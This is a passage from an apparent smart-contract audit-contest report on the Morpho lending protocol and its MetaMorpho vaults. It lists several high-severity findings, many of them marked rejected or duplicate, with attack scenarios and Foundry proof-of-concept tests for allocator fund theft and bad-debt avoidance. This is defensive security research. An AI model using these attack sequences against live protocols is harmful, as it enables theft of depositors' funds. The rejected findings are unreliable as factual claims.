```solidity
 function liquidate(
        MarketParams memory marketParams,
        address borrower,
        uint256 seizedAssets,
        uint256 repaidShares,
        bytes calldata data
    ) external returns (uint256, uint256) {
        Id id = marketParams.id();
        require(market[id].lastUpdate != 0, ErrorsLib.MARKET_NOT_CREATED);
        require(UtilsLib.exactlyOneZero(seizedAssets, repaidShares), ErrorsLib.INCONSISTENT_INPUT);

        _accrueInterest(marketParams, id);

        uint256 collateralPrice = IOracle(marketParams.oracle).price();

        require(!_isHealthy(marketParams, id, borrower, collateralPrice), ErrorsLib.HEALTHY_POSITION);

        uint256 repaidAssets;
        {
            // The liquidation incentive factor is min(maxLiquidationIncentiveFactor, 1/(1 - cursor*(1 - lltv))).
            uint256 liquidationIncentiveFactor = UtilsLib.min(
                MAX_LIQUIDATION_INCENTIVE_FACTOR,
                WAD.wDivDown(WAD - LIQUIDATION_CURSOR.wMulDown(WAD - marketParams.lltv))
            );

            if (seizedAssets > 0) {
                repaidAssets =
                    seizedAssets.mulDivUp(collateralPrice, ORACLE_PRICE_SCALE).wDivUp(liquidationIncentiveFactor);
                repaidShares = repaidAssets.toSharesDown(market[id].totalBorrowAssets, market[id].totalBorrowShares);
            } else {
                repaidAssets = repaidShares.toAssetsUp(market[id].totalBorrowAssets, market[id].totalBorrowShares);
                seizedAssets =
                    repaidAssets.wMulDown(liquidationIncentiveFactor).mulDivDown(ORACLE_PRICE_SCALE, collateralPrice);
            }
        }

        position[id][borrower].borrowShares -= repaidShares.toUint128();
        market[id].totalBorrowShares -= repaidShares.toUint128();
        market[id].totalBorrowAssets = UtilsLib.zeroFloorSub(market[id].totalBorrowAssets, repaidAssets).toUint128();

        position[id][borrower].collateral -= seizedAssets.toUint128();

        uint256 badDebtShares;
        if (position[id][borrower].collateral == 0) {
            badDebtShares = position[id][borrower].borrowShares;
            uint256 badDebt = UtilsLib.min(
                market[id].totalBorrowAssets,
                badDebtShares.toAssetsUp(market[id].totalBorrowAssets, market[id].totalBorrowShares)
            );

            market[id].totalBorrowAssets -= badDebt.toUint128();
            market[id].totalSupplyAssets -= badDebt.toUint128();
            market[id].totalBorrowShares -= badDebtShares.toUint128();
            position[id][borrower].borrowShares = 0;
        }

        IERC20(marketParams.collateralToken).safeTransfer(msg.sender, seizedAssets);

        // `repaidAssets` may be greater than `totalBorrowAssets` by 1.
        emit EventsLib.Liquidate(id, msg.sender, borrower, repaidAssets, repaidShares, seizedAssets, badDebtShares);

        if (data.length > 0) IMorphoLiquidateCallback(msg.sender).onMorphoLiquidate(repaidAssets, data);

        IERC20(marketParams.loanToken).safeTransferFrom(msg.sender, address(this), repaidAssets);

        return (seizedAssets, repaidAssets);
    }

```

This is problematic, because a liquidator can specify the amount of assets he will seize. An malicious liquidator can seize enough assets in such a way that `position[id][borrower].collateral` is nearly 0 but not 0. 

```solidity
  if (position[id][borrower].collateral == 0) {
            badDebtShares = position[id][borrower].borrowShares;
            uint256 badDebt = UtilsLib.min(
                market[id].totalBorrowAssets,
                badDebtShares.toAssetsUp(market[id].totalBorrowAssets, market[id].totalBorrowShares)
            );

            market[id].totalBorrowAssets -= badDebt.toUint128();
            market[id].totalSupplyAssets -= badDebt.toUint128();
            market[id].totalBorrowShares -= badDebtShares.toUint128();
            position[id][borrower].borrowShares = 0;
        }
```
Because of the if statement above, bad debt will not be socialized in the previous scenario. Now you may say another liquidator can fully liquidate the user and this will allow debt to be socialized, but because there is very few collateral left, the liquidator will not profit from such liquidations. Essentially the next liquidator will have to lose out money because gas costs will be more expensive than any profit he will make liquidating accounts with nearly 0 collateral. Liquidators only liquidate for the profit, especially in a permission less app like this one, no one will go out of their way to lose funds to liquidate. 

A malicious liquidator can do this same attack in every market, liquidating 99% of a user and leaving a small amount so that his debt is never socialized. I believe this is likely because the malicious liquidator can be a supplier who does not want the loss socialized to his position. 

**Impact**:

Because bad debt is never socialized, in an event where users want to withdraw from a market, there will not be enough funds for everyone to withdraw. The last withdrawers will lose out on all of their funds. This can happen to all markets on morpho.

**Recommendation**:
Implement logic that ensures bad debt is socialized and cannot be avoided.



### There is no incentive to liquidate small positions	_(this issue has been rejected)_

**Severity:** High risk

**Context:** _(No context files were provided by the reviewer)_

**Description**:
Business Logic 

Liquidators liquidate positions for the profits they can make, liquidators will not liquidate a position if there is no profit to be made. More so a liquidator will not liquidate a position if it costs him money to do so. This is the case for any low value positions. The incentive a liquidator receives for liquidating a small position will never outweigh the gas costs on mainnet, this will lead to many low value positions to never be liquidated. Additionally this means bad debt will never be socialized because this happens in the liquidate function as we can see below from the snippet of the function Liquidate.

```solidity
 uint256 badDebtShares;
        if (position[id][borrower].collateral == 0) {
            badDebtShares = position[id][borrower].borrowShares;
            uint256 badDebt = UtilsLib.min(
                market[id].totalBorrowAssets,
                badDebtShares.toAssetsUp(market[id].totalBorrowAssets, market[id].totalBorrowShares)
            );

            market[id].totalBorrowAssets -= badDebt.toUint128();
            market[id].totalSupplyAssets -= badDebt.toUint128();
            market[id].totalBorrowShares -= badDebtShares.toUint128();
            position[id][borrower].borrowShares = 0;
        }
```

Low value positions may be opened by legitimate users, but may also be leveraged by a malicious user. A malicious user may open many low value positions in attempts to fill a certain market with bad debt that will never be socialized/liquidated.

The cost of gas on eth main net is currently 45 gwei, the gas usage by the liquidate function on goerli is 172,075, some liquidations may cost more or less this is just an example.

using the above numbers we can calculate the cost of a liquidation to be $15 on eth main net.
assuming the best case scenario of a Liquidation Incentive Factor = 1.15,

 this means that liquidating accounts with a value of up to $100 will not be profitable. Therefore these positions will likely never be liquidated.



**Impact**: 

Because low value positions are never liquidated, their bad debt is never socialized. If a bank run were to occur, the last withdrawing users will not be able to withdraw all of their assets, and in some cases lose all of their assets. Given that this can happen naturally with legitimate users positions, and can also be utilized by a malicious user, I think high severity is appropriate. 

**Recommendation**:
set a minimum amount required to borrow so that the liquidation incentive is higher than the cost of gas to liquidate in most cases. 



### Metamorpho owner is capable of use flashloan to steal fund from vault by minting high fee shares	_(this issue has been rejected)_

**Severity:** High risk

**Context:** [MetaMorpho.sol#L903-L926](metamorpho/src/MetaMorpho.sol#L903-L926)

**Description**

Metamorpho owner is capable of use flashloan to steal fund from vault by minting high fee shares

1. deploy a metamorpho instance
3. set up supply queue and withdraw queue, both for USDC market
4. wait for other user deposit fund into USDC market
5. flashloan large amount of USDC, deposit into the metamorpho vault,
6. because the amount of fee minted increases with the amount of asset in the vault, high amount of fee share is [minted to the fee recipient address](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L907)
7. owner use the share minted with flashloan + the fee share to withdraw fund from the morpho lending market to repay flashloan
8. owner of the metamorpho work away with profits in the form of high fee share, he can use the fee share to withdraw more fund from the vault
before step 3, owner can [set high fee (up to 50%)](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L235) to maxmized the minted fee to rug user fund

**Recommendation**

emm I think one of the way to stop this exploit is to limit the max fee amount (to 2.5% or lower)
and make sure the owner of the metamorpho is not smart contract




### Lack of slippage control parameter in the four functions of the MetaMorpho contract, which allow to launch a sandwich attack	_(this issue has been rejected)_

**Severity:** High risk

**Context:** [MetaMorpho.sol#L559-L559](metamorpho/src/MetaMorpho.sol#L559-L559)

- Description
Within the MetaMorpho contract, a user can **directly** call the `deposit()`/`mint()`/`withdraw()`/`redeem()` and the `shares` or the `assets` would be calculated respectively like this:

- MetaMorpho#`deposit()` \
  https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/metamorpho/src/MetaMorpho.sol#L559 \
  https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/metamorpho/src/MetaMorpho.sol#L566
```solidity
    /// @inheritdoc IERC4626
    function deposit(uint256 assets, address receiver) public override returns (uint256 shares) { ///<-------- @audit
        ...
        shares = _convertToSharesWithTotals(assets, totalSupply(), newTotalAssets, Math.Rounding.Floor); ///<-------- @audit

        _deposit(_msgSender(), receiver, assets, shares);
    }
```

- MetaMorpho#`mint()` \
  https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/metamorpho/src/MetaMorpho.sol#L572 \
  https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/metamorpho/src/MetaMorpho.sol#L579
```solidity
    /// @inheritdoc IERC4626
    function mint(uint256 shares, address receiver) public override returns (uint256 assets) { ///<-------- @audit
        ...
        assets = _convertToAssetsWithTotals(shares, totalSupply(), newTotalAssets, Math.Rounding.Ceil); ///<-------- @audit

        _deposit(_msgSender(), receiver, assets, shares);
    }
```

- MetaMorpho#`withdraw()` \
   https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/metamorpho/src/MetaMorpho.sol#L585 \
   https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/metamorpho/src/MetaMorpho.sol#L590 
```solidity
    /// @inheritdoc IERC4626
    function withdraw(uint256 assets, address receiver, address owner) public override returns (uint256 shares) { ///<-------- @audit
        ...

        shares = _convertToSharesWithTotals(assets, totalSupply(), newTotalAssets, Math.Rounding.Ceil); ///<-------- @audit
        ...

        _withdraw(_msgSender(), receiver, owner, assets, shares);
    }
```

- MetaMorpho#`redeem()` \
   https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/metamorpho/src/MetaMorpho.sol#L599 \
   https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/metamorpho/src/MetaMorpho.sol#L604
```solidity
    /// @inheritdoc IERC4626
    function redeem(uint256 shares, address receiver, address owner) public override returns (uint256 assets) { ///<-------- @audit
        ...

        assets = _convertToAssetsWithTotals(shares, totalSupply(), newTotalAssets, Math.Rounding.Floor); ///<-------- @audit
        ...

        _withdraw(_msgSender(), receiver, owner, assets, shares);
    }
```

However, the following functions of the MetaMorpho contract above, there are **no** slippage control parameters for a user (`msg.sender`) to be able to specify the **minimum output amount** and there is no validations to check wether or not the output amount would be greater than or equal to the **minimum output amount**.

This lead to that a user who _**directly**_ call the MetaMorpho#`deposit()`/`mint()`/`withdraw()`/`redeem()` would receive the **much less output amount** of assets or shares than the output amount which the user expected - due to a **sandwich** attack. 


- Attack scenario

Here is an example attack scenario:

- 1/ Alice deposit some amount of loan token via **directly** calling the MetaMorpho#`deposit()`.
- 2/ A MEV bot observe this transaction and immediately call the MetaMorpho#`deposit()` with a **large amount** of loan token and a large amount of gas fee to **front-run** the transaction 1/.
- 3/ Due to the step 2/, the MEV bot receive a large amount of shares. 
- 4/ Alice would receive much less amount of shares than the amount that she expected. Because, **by the step 3/**, the `totalSupply()` of the shares and `newTotalAssets` would be dramatically increased than the both amount, which Alice called the MetaMorpho#`deposit()` when the step 2/. And therefore, the amount of the shares that Alice receive would relatively be much less than the amount, which Alice called the MetaMorpho#`deposit()` when the step 2/.
- 5/ Just after the transaction of the step 4/, a MEV bot would immediately call the MetaMorpho#`redeem()` to redeem their shares for assets to **back-run**.
- 6/ The MEV bot would receive the larger amount of the assets than the amount of the assets, which the MEV bot deposit via the MetaMorpho#`deposit()` when the step 2/. This means that the MEV bot made a profit by a sandwich attack (front-running + back-running).


- Recommendation
Within the MetaMorpho#`deposit()`, consider adding the minimum output shares (`minShares`) parameter like this:
```diff
+   function deposit(uint256 assets, address receiver, uint256 minShares) public override returns (uint256 shares) {
-   function deposit(uint256 assets, address receiver) public override returns (uint256 shares) {
        ...
        shares = _convertToSharesWithTotals(assets, totalSupply(), newTotalAssets, Math.Rounding.Floor);
+       require(shares >= minShares, "The output shares must be greater than or equal to the minimum output shares");

        _deposit(_msgSender(), receiver, assets, shares);
    }
```

Within the MetaMorpho#`mint()`, consider adding the minimum output assets (`minAssets`) parameter like this:
```diff
    /// @inheritdoc IERC4626
+   function mint(uint256 shares, address receiver, uint256 minAssets) public override returns (uint256 assets) {
-   function mint(uint256 shares, address receiver) public override returns (uint256 assets) {
        ...
        assets = _convertToAssetsWithTotals(shares, totalSupply(), newTotalAssets, Math.Rounding.Ceil);
+       require(assets >= minAssets, "The output assets must be greater than or equal to the minimum output assets");

        _deposit(_msgSender(), receiver, assets, shares);
    }
```

Within the MetaMorpho#`withdraw()`, consider adding the minimum output shares (`minShares`) parameter like this:
```diff
+   function withdraw(uint256 assets, address receiver, address owner, uint256 minShares) public override returns (uint256 shares) {
-   function withdraw(uint256 assets, address receiver, address owner) public override returns (uint256 shares) {
        ...

        shares = _convertToSharesWithTotals(assets, totalSupply(), newTotalAssets, Math.Rounding.Ceil);
+       require(shares >= minShares, "The output shares must be greater than or equal to the minimum output shares");
        ...

        _withdraw(_msgSender(), receiver, owner, assets, shares);
    }
```

Within the MetaMorpho#`redeem()`, consider adding the minimum output assets (`minAssets`) parameter like this:
```diff
+   function redeem(uint256 shares, address receiver, address owner, uint256 minAssets) public override returns (uint256 assets) {
-   function redeem(uint256 shares, address receiver, address owner) public override returns (uint256 assets) {
        ...

        assets = _convertToAssetsWithTotals(shares, totalSupply(), newTotalAssets, Math.Rounding.Floor); 
+       require(assets >= minAssets, "The output assets must be greater than or equal to the minimum output assets");
        ...

        _withdraw(_msgSender(), receiver, owner, assets, shares);
    }
```




### Market removal enables allocator to steal user funds, users to steal funds from each other	_(duplicate of [Removing Market From `withdrawQueue` Could Result In Regular User Losses])_

**Severity:** High risk

**Context:** [MetaMorpho.sol#L378-L378](metamorpho/src/MetaMorpho.sol#L378-L378), [MetaMorpho.sol#L604-L604](metamorpho/src/MetaMorpho.sol#L604-L604), [MetaMorpho.sol#L614-L614](metamorpho/src/MetaMorpho.sol#L614-L614)

- Description

Despite the docs saying otherwise, the code very clearly allows removing a market from the withdraw queue after the timelock even if there is still supply remaining. And reallocate() allows for actually using said supply.

However, the total assets are computed only from markets still within the withdraw queue, and shares are computed based on that reduced set of assets.

These combined allow an allocator to steal user funds. It also allows an allocator to accidentally create a scenario that allows users to steal funds from each other.


- Intentional scenario:

_Scroll down for a full POC demonstrating this works_

1. Metamorpho instance for lending WETH supplies two markets, Market 1 and Market 2. Market A has a cap of 25 WETH, and Market B has a cap of 100 WETH
2. Investors deposit a total of 30 WETH. 25 is supplied to Market 1, and 5 is supplied to market 2.
3. Curator decides to remove Market 1, for whatever reason. They may be colluding with the attacking allocator, or they may expect the allocator to properly defund Market 1 before removing it. No-one expects that this will enable theft.
4. After the timelock delay, an allocator does the following in a single transaction:

4a. Allocator removes Market 1 from the withdraw queue.

4b. At this point, Metamorpho has 25 WETH supplied to Market 1, but its totalAssets() is only 5 WETH.

4c.. The allocator deposits 45 WETH in Metamorpho and gets 90% of the shares

4d.. The allocator immediately calls reallocate()  to move 25 WETH  from Market 1 to Market 2.  Note that reallocate() explicitly allows for withdrawing funds from a market not in the withdraw queue.

4e. The allocator withdraws their shares, and gets  90% of 75 WETH, or 67.5. They have stolen 22.5 WETH from the other investors. (Actually a teeny bit less due to rounding.)

Note that the allocator can do this using a flash loan. For added fun, they can even flash loan from the same Morpho instance.

- Accidental scenario:

Same as above, except that it's unintentional that the allocator removes a market while there is still supply in it.

Anyone who withdraws from Metamorpho at that point would be denied 5/6 of their rightfully-held assets. And anyone who deposits at that point would have received too many shares; as soon as Market 1 is re-added or as soon as its supply is reallocate()'d, they will be able to withdraw token that rightfully belongs to other users. 

- POC

Here is a POC demonstrating the attack. Run this code in a class which extends IntegrationTest.

```
  function setUp() public override {
        super.setUp();

        _setCap(allMarkets[0], CAP2);
        _setCap(allMarkets[1], CAP2);

        _sortSupplyQueueIdleLast();

        loanToken.setBalance(SUPPLIER, INITIAL_DEPOSIT);
    }

    function testAllocatorStealsEverythingPoc() public {
        // Scenario step 1
        _setCap(allMarkets[0], 25 ether);
        _setCap(allMarkets[1], 100 ether);

        // Scenario step 2
        vm.prank(SUPPLIER);
        vault.deposit(30 ether, SUPPLIER);

        // Scenario step 3
        vm.prank(CURATOR);
        vault.submitMarketRemoval(allMarkets[0].id());

        vm.warp(block.timestamp + vault.timelock());

        // Scenario step 4
        vm.startPrank(ALLOCATOR);

        // Scenario step 4a
        uint256[] memory newWithdrawQueue = new uint256[](2);
        // Withdraw queue at this point is: idle market, allMarkets[0], allMarkets[1]
        newWithdrawQueue[0] = 0;
        newWithdrawQueue[1] = 2;
        vault.updateWithdrawQueue(newWithdrawQueue);

        // Scenario step 4b
        assert(vault.totalAssets() == 5 ether);

        // Scenario step 4c
        loanToken.setBalance(ALLOCATOR, 450 ether);
        loanToken.approve(address(vault), type(uint256).max);

        // Supply queue at this point is: allMarkets[0]
        vault.deposit(45 ether, ALLOCATOR);

        
        // Scenario step 4d
        allocations.push(MarketAllocation(allMarkets[0], 0));
        allocations.push(MarketAllocation(allMarkets[1], type(uint256).max));
        vault.reallocate(allocations);

        // Scenario step 4e
        vault.withdraw(67.4999999 ether, ALLOCATOR, ALLOCATOR); // Rounding error; not quite 67.5
    }
```

- Recommendation

Do not allow zero-supply markets to be removed, period. An anti-griefing feature has already been implemented.



### fetch price will not prolly work and revert transaction which use that fetching price like liquidation	_(duplicate of [Decommissioned Oracle Feeds can cause denial of service])_

**Severity:** High risk

**Context:** [ChainlinkOracle.sol#L118-L118](morpho-blue-oracles/src/ChainlinkOracle.sol#L118-L118)

Calls to [Oracles could potentially revert](https://code4rena.com/reports/2022-07-juicebox#m-09-unhandled-chainlink-revert-would-lock-all-price-oracle-access), which may result in a complete Denial-of-Service to smart contracts which depend upon them. Chainlink multisigs can immediately block access to price feeds at will, so just because a price feed is working today does not mean it will continue to do so indefinitely. Smart contracts should handle this by:


> wrapping calls to Oracles in try/catch blocks and dealing appropriately with any errors,

> providing functionality to replace or update oracle feeds after they are configured.




### Any User Can Grief The Whole System By Sending Any ERC20 To The Skim Receiver	_(this issue has been rejected)_

**Severity:** High risk

**Context:** _(No context files were provided by the reviewer)_

MetaMorpho is a simple ERC4626 vault system , user deposits , withdraws , mints and receives. 

Any user can call the function skim here https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L513 and send any ERC20 token in the contract to the skim receiver.

Assume Alice deposited X amount of tokenA in the vault and she wants to have her deposits there for atleast a month and then withdraw , any attacker can call skim with the tokenA as parameter and sweep that token from the contract. 
Because of this when Alice wants to withdraw her deposited assets from the vault , there would be no assets and the transfer would revert (https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/extensions/ERC4626.sol#L278)

The entire deposits in the vault can be sweeped immediately by anyone.

Similarly for redeem , anyone can call skim with the token and sweep away all the token purposely griefing the entire vault system.


Recommendation:

Have onlyOwner on the skim function or have a whitelist of tokens that can be skimmed



### protocol gonna be drained if price dropped lower than minAnswer	_(duplicate of [Relying on the Chainlink feeds keeping its promises can result in massive loss of funds for user ])_

**Severity:** High risk

**Context:** [ChainlinkDataFeedLib.sol#L20-L20](morpho-blue-oracles/src/libraries/ChainlinkDataFeedLib.sol#L20-L20)

Chainlink price feeds have in-built minimum & maximum prices they will return; if during a flash crash, bridge compromise, or depegging event, an asset’s value falls below the price feed’s minimum price, [the oracle price feed will continue to report the (now incorrect) minimum price](https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/18).


An attacker could:



buy that asset using a decentralized exchange at the very low price,




deposit the asset into a Lending / Borrowing platform using Chainlink’s price feeds,




borrow against that asset at the minimum price Chainlink’s price feed returns, even though the actual price is far lower.



To help mitigate such an attack on-chain, smart contracts could check that minAnswer < receivedAnswer < maxAnswer.


This attack could also potentially be mitigated off-chain via off-chain monitoring, which compares Chainlink’s latest reported price to other off-chain sources such as centralized exchanges and/or liquid indexes which aggregate multiple off-chain price sources to produce one index price; if external sources are reporting prices lower than Chainlink’s minAnswer, off-chain monitoring could disable the smart contract’s price feed for that asset, forcing any transactions to revert.


ChainLink will keep giving minAnswer althought actual price is below that minAnswer according to his promise .Protocol gonna be drained by this exploitation if price dropped to lower than minAnsw



###  Lack of slippage in some instances of borrowing/supplying	_(this issue has been rejected)_

**Severity:** High risk

**Context:** _(No context files were provided by the reviewer)_



- Proof of Concept

An inconsistency was identified in the implementation of slippage checks within the `MorphoBundler` contract. Specifically, the `morphoSupplyCollateral` function lacks slippage checks, which are present in other functions such as `morphoSupply` and `morphoBorrow`.

The issue is observed in the `morphoSupplyCollateral` function:

```solidity
function morphoSupplyCollateral(
    // Parameters
) external payable protected {
    // Function implementation
}
```

Unlike `morphoSupply` and `morphoBorrow`, this function does not include slippage control logic, potentially leading to scenarios where users receive fewer tokens than expected without any checks or warnings and inherently causing massive losses.

- Impact

The absence of slippage checks in `morphoSupplyCollateral` (and potentially other similar functions) could lead to unexpected financial outcomes for users. They might end up supplying collateral but receiving less value than anticipated due to market movements, without any safeguard or warning mechanism in place.

- Code Snippet

```solidity
// Inconsistent slippage check
//@audit-issue: Slippage check missing
    function morphoSupplyCollateral(
        MarketParams calldata marketParams,
        uint256 assets,
        address onBehalf,
        bytes calldata data
    ) external payable protected {
        // Do not check `onBehalf` against the zero address as it's done at Morpho's level.
        require(onBehalf != address(this), ErrorsLib.BUNDLER_ADDRESS);

        // Don't always cap the assets to the bundler's balance because the liquidity can be transferred later
        // (via the `onMorphoSupplyCollateral` callback).
        if (assets == type(uint256).max) assets = ERC20(marketParams.collateralToken).balanceOf(address(this));

        _approveMaxTo(marketParams.collateralToken, address(MORPHO));

        MORPHO.supplyCollateral(marketParams, assets, onBehalf, data);
    }
```

- Recommended Mitigation Steps

To resolve this issue, it is recommended to introduce similar slippage control mechanisms in the `morphoSupplyCollateral` function, as observed in `morphoSupply` and `morphoBorrow`. This would ensure that users are adequately protected against adverse slippage and receive an amount of collateral within their expected range.




### User will be DoSed from getting Rewards despite correct merkle proofs	_(duplicate of [Issue on `claim` mechanism can lead to incomplete or failed claims])_

**Severity:** High risk

**Context:** _(No context files were provided by the reviewer)_

- Description

The `UniversalRewardsDistributor` contract is designed for distributing diverse reward tokens using distinct Merkle trees.

But it contains a Bug in the way it is handling the `claimed` state variable.

```solidity
File: UniversalRewardsDistributor.sol

    function claim(address account, address reward, uint256 claimable, bytes32[] calldata proof)
        external
        returns (uint256 amount)
    {
        require(root != bytes32(0), ErrorsLib.ROOT_NOT_SET);
        require(
            MerkleProof.verifyCalldata(
                proof, root, keccak256(bytes.concat(keccak256(abi.encode(account, reward, claimable))))
            ),
            ErrorsLib.INVALID_PROOF_OR_EXPIRED
        );

127:    require(claimable > claimed[account][reward], ErrorsLib.CLAIMABLE_TOO_LOW);

129:    amount = claimable - claimed[account][reward];

131:    claimed[account][reward] = claimable;

        ERC20(reward).safeTransfer(account, amount);

        emit EventsLib.Claimed(account, reward, amount);
    }

```

This Bug exposes users to DoS in claiming their reward tokens, particularly when attempting to claim rewards for the same token multiple times. The issue arises from the lack of differentiation between different roots in the `claimed` variable. Check out PoC Steps:

**Proof of Concept:**

Consider the following Scenario:

1. Alice initiates the distribution of `1000 USDT` to 5 recipients, setting the initial `root` after deploying the `UniversalRewardsDistributor` contract.
2. Bob successfully claims his share using the `claim` function, updating the state: `claimed[Bob's Addr][USDT Addr] = 1000`.
3. After some time, Alice decides to distribute another `1000 USDT` to another 10 individuals (including Bob), so she submits the root which will be updated after a timelock period.
4. Bob, equipped with correct proofs, attempts to claim again.
5. The call fails at line 127 due to `claimable = 1000` and `claimed[Bob's Addr][USDT Addr] = 1000`.

The problem comes from not keeping track of different `root` in the `claimed` variable. Because of this, the contract wrongly thinks Bob has already received the tokens. This mix-up stops users from successfully claiming rewards more than once, causing DoS of Funds.

**Impact:**

Due to the improper handling of the `claimed`, users will lose at least the previously claimed amount of tokens when attempting to claim rewards for the same token multiple times.

- Recommendation

I would recommend to update the `claimed` state variable to differentiate between different roots. Apply the following changes:

```diff

-30:    mapping(address account => mapping(address reward => uint256 amount)) public claimed;
+30:    mapping(address account => mapping(address reward => mapping(bytes32 root => uint256 amount))) public claimed;

-127:   require(claimable > claimed[account][reward], ErrorsLib.CLAIMABLE_TOO_LOW);
+127:   require(claimable > claimed[account][reward][root], ErrorsLib.CLAIMABLE_TOO_LOW);

-129:   amount = claimable - claimed[account][reward];
+129:   amount = claimable - claimed[account][reward][root];

-131:   claimed[account][reward] = claimable;
+131:   claimed[account][reward][root] = claimable;

```




### Users can lose a portion of their funds when a market with supplyShares is removed	_(this issue has been rejected)_

**Severity:** High risk

**Context:** _(No context files were provided by the reviewer)_

- Description
Metamorpho keeps a record of markets it supports in its supplyQueue and withdrawQueue. When a user deposits, his deposit goes into the `supplyQueue` and `totalAssets()` is used to ensure to get all the assets Metamorpho currently has. `totalAssets()` iterates through all the markets in the `withdrawQueue` and adds up the assets in each of them.

```
    function totalAssets() public view override returns (uint256 assets) {
        for (uint256 i; i < withdrawQueue.length; ++i) {
            assets += MORPHO.expectedSupplyAssets(_marketParams(withdrawQueue[i]), address(this));
        }
    }
```

The withdrawQueue can be updated by the `updateWithdrawQueue` function. The function can remove markets and reorder the markets in the queue. It is called by allocators. To remove a market, it must have a zero supply cap and zero supply shares. 

The curator can propose a market to be removed with `submitMarketRemoval()`. This sets the supply cap to zero and `removableAt` variable in the market configuration to a later time in the future. The issue here is that the market can be removed when `removableAt` has been exceeded and the market still has supply shares. It's worth noting that this function does not reallocate the current supply shares the market has.

Allocators complete the market removal by calling `updateQithdrawQueue`. Before calling `updateQithdrawQueue()`, allocators are meant to call `reallocate()` to reallocate supply shares in markets to be removed. But even if they don't the market can still be removed provided the timestamp has exceeded `removableAt`. 

```
...
        for (uint256 i; i < currLength; ++i) {
            if (!seen[i]) {
                Id id = withdrawQueue[i];

                if (config[id].cap != 0) revert ErrorsLib.InvalidMarketRemovalNonZeroCap(id);
                
                if (MORPHO.supplyShares(id, address(this)) != 0) {
                    if (config[id].removableAt == 0) revert ErrorsLib.InvalidMarketRemovalNonZeroSupply(id);

                    if (block.timestamp < config[id].removableAt) {
                        revert ErrorsLib.InvalidMarketRemovalTimelockNotElapsed(id);
                    }
                }

                delete config[id];
            }
        }
...
```

The snippet above is from the `updateWithdrawQueue` function. The for checks if markets are eligible to be removed. It checks if the market supply cap is zero with:

```
if (config[id].cap != 0) revert ErrorsLib.InvalidMarketRemovalNonZeroCap(id);
```

In the following if statement it checks if the markets `supplyShares` is zero, if it is it can be removed. But if it isn't but `removableAt` has been exceeded the market can still be removed. If this happens Metamorpho users lose some or even all of their deposits.

This may be a desirable feature if the market is stuck (e.g Interest Rate Model (IRM) or oracle calls fail) and the shares cannot be reallocated with the `reallocate` function. If this is the case it should be explicitly stated in the Natspec comments and other documentation. However, considering that the role that proposes a market to be removed and the role that removes the market are different poses an issue. 

The curator can innocently propose a market to be removed and when `removedAt` has exceeded, one of the allocators can maliciously call `updateWithdrawQueue` without calling `reallocate`. He may just even forget to call it. 

When a market is removed, users lose a part or even all of their funds if that's the only market on Metamorpho. More information about this is in the Impact section.

- Impact 
When a market with supplyShares is removed, it is removed from the `withdrawQueue`. Hence the total assets returned by `totalAssets()` is less.

```
    function totalAssets() public view override returns (uint256 assets) {
        for (uint256 i; i < withdrawQueue.length; ++i) {
            assets += MORPHO.expectedSupplyAssets(_marketParams(withdrawQueue[i]), address(this));
        }
    }
```
This means that when a user calls `redeem` or `withdraw`, he will likely withdraw less than what he deposited.  If he calls to withdraw with the amount of assets he deposited it may revert.

```
    function redeem(uint256 shares, address receiver, address owner) public override returns (uint256 assets) {
        uint256 newTotalAssets = _accrueFee();

        // Do not call expensive `maxRedeem` and optimistically redeem shares.

        assets = _convertToAssetsWithTotals(shares, totalSupply(), newTotalAssets, Math.Rounding.Floor);

        // `newTotalAssets - assets` may be a little off from `totalAssets()`.
        _updateLastTotalAssets(newTotalAssets.zeroFloorSub(assets));

        _withdraw(_msgSender(), receiver, owner, assets, shares);
    }
```

The `newTotalAssets` returned by the `_accrueFee` will be less and when `assets` is calculated it will make use of a smaller `newTotalAssets` than what it would have used when the market was not removed, allowing the user to get less assets than he deposited.

Furthermore, if a user deposits when the market is removed, he will be able to claim more than he deposited if the market is added back.

- Proof Of Concept
This POC shows users depositing and claiming less assets than they initially deposited.

```
function testUpdateWithdrawQueueInvalidMarketRemovalNonZeroSupply() public {
        loanToken.setBalance(SUPPLIER, 4);
        address RECEIVER2 = makeAddr("Receiver2");
        // set cap to make sure only first deposit goes in first market
        _setCap(idleParams, 2);

        vm.startPrank(SUPPLIER);
        uint256 shares1 = vault.deposit(2, RECEIVER);
        uint256 shares2 = vault.deposit(2, RECEIVER2);
        vm.stopPrank();

        vm.prank(CURATOR);
        vault.submitMarketRemoval(idleParams.id());
        // makes market removal valid
        vm.warp(block.timestamp + TIMELOCK);
        _setCap(idleParams, 0);

        uint256[] memory indexes = new uint256[](3);
        indexes[0] = 1;
        indexes[1] = 2;
        indexes[2] = 3;

        // removes market 1
        vm.prank(ALLOCATOR);
        vault.updateWithdrawQueue(indexes);

        // first receiver withdraws
        vm.startPrank(RECEIVER);
        // requires more shares to withdraw 2
        vm.expectRevert(abi.encodeWithSignature("ERC20InsufficientBalance(address,uint256,uint256)", RECEIVER, 2000000, 3333334)); 
        vault.withdraw(2, RECEIVER, RECEIVER);
        // receives 1 token
        vault.redeem(shares1, RECEIVER, RECEIVER);
        assertEq(loanToken.balanceOf(RECEIVER), 1);

        // second receiver withdraws
        vm.startPrank(RECEIVER2);

        // not enough liquidity to withdraw 2
        vm.expectRevert(abi.encodeWithSignature("NotEnoughLiquidity()"));
        vault.withdraw(2, RECEIVER2, RECEIVER2);
        // receives 1 token
        vault.redeem(shares2, RECEIVER2, RECEIVER2);
        assertEq(loanToken.balanceOf(RECEIVER2), 1);
    }
```

- Recommendation
